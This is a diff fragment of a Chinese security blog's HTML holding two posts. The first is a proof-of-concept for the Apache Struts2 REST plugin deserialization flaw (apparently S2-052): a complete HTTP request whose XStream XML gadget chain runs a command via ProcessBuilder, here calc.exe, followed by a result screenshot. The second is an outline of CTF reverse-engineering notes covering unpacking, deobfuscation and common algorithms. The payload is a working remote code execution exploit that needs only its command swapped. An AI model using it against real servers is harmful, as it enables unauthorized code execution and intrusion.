+<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /struts2-rest-showcase/orders.xhtml HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit</span><br><span class="line">Cookie: JSESSIONID=6FBA41434A908795E708AE545267C797; UM_distinctid=15e36471d10d0-09d67d334fbd0f8-49594234-100200-15e36471d11231; CNZZDATA1670348=cnzz_eid%3D1690420666-1504145890-%26ntime%3D1504329636</span><br><span class="line">Connection: close</span><br><span class="line">If-None-Match: 182927695</span><br><span class="line">Content-Length: 1647</span><br><span class="line"></span><br><span class="line">&lt;map&gt; </span><br><span class="line">&lt;entry&gt; </span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;C:\Windows\System32\calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; </span><br><span class="line">&lt;/entry&gt; </span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="效果如下："><a href="#效果如下：" class="headerlink" title="效果如下："></a>效果如下：</h3><p><a href="http://osuq6jhys.bkt.clouddn.com/s2-052.png" target="_blank" rel="noopener"><img src="http://osuq6jhys.bkt.clouddn.com/s2-052.png" alt="效果图"></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-CTF-逆向 基础"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/08/29/CTF-逆向 基础/">CTF-逆向 基础</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/08/29/CTF-逆向 基础/" class="article-date">
+	  <time datetime="2017-08-29T15:53:56.000Z" itemprop="datePublished">2017-08-29</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CTF-逆向-基础"><a href="#CTF-逆向-基础" class="headerlink" title="CTF-逆向 基础"></a>CTF-逆向 基础</h1><p><a href="http://shackles.top/2017/08/07/%E9%80%86%E5%90%91/"> 2017-08-07</a></p>
+<p><a href="https://www.gitbook.com/book/wizardforcel/re-for-beginners/details" target="_blank" rel="noopener">https://www.gitbook.com/book/wizardforcel/re-for-beginners/details</a></p>
+<h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><ul>
+<li>ida 调试 安卓 native层</li>
+<li>设置断点</li>
+<li>设置程序 安卓附加上去，IDA F5调试</li>
+</ul>
+<h4 id="去除软件保护"><a href="#去除软件保护" class="headerlink" title="去除软件保护"></a>去除软件保护</h4><ul>
+<li><p>侦壳 PEID Exelnfo （查看是什么壳）</p>
+</li>
+<li><p>脱壳</p>
+<ul>
+<li>脱壳机</li>
+<li>esp 定快速脱壳</li>
+</ul>
+</li>
+<li><p>去除花指令</p>
+<ul>
+<li>OLLyDBG脚本</li>
+</ul>
+</li>
+<li><p>去除混淆</p>
+<ul>
+<li><p>net 反混淆de4dot</p>
+<h4 id="定位验证代码"><a href="#定位验证代码" class="headerlink" title="定位验证代码"></a>定位验证代码</h4></li>
+</ul>
+</li>
+<li><p>验证代码（算法）</p>
+<ol>
+<li><p>正面驱动直入</p>
+</li>
+<li><p>从输入输出寻找</p>
+</li>
+<li><p>利用字符串找</p>
+<h4 id="CTF逆向常见算法"><a href="#CTF逆向常见算法" class="headerlink" title="CTF逆向常见算法"></a>CTF逆向常见算法</h4></li>
+</ol>
+</li>
+<li><p>简单算法</p>
+</li>
+</ul>
+<ol>
+<li>简单异或</li>
+<li>带雪崩的异或</li>
+<li>加密算法（AES , RSA)</li>
+<li>散列算法（MD5，SHA1)</li>
+<li>解方程</li>
+</ol>
+<ul>
+<li>有趣的算法</li>
+</ul>
+<ol>
+<li><p>走迷宫</p>
+</li>
+<li><p>..各种脑洞</p>
+<h4 id="经验加成"><a href="#经验加成" class="headerlink" title="经验加成"></a>经验加成</h4></li>
+<li><p>边信道攻击</p>
+</li>
+<li><p>Google 大法好</p>
+</li>
+<li><p>逆向trick</p>
+<ol>
+<li>xspy 应对MFC程序</li>
+<li>手动加载signature</li>
+<li>调试小技巧</li>
+</ol>
+</li>
+</ol>
+<p>CTF VS 现实</p>
+<ol>
+<li><p>IDA高级使用</p>
+</li>
+<li><p>​</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
 
     </footer>
   </div>
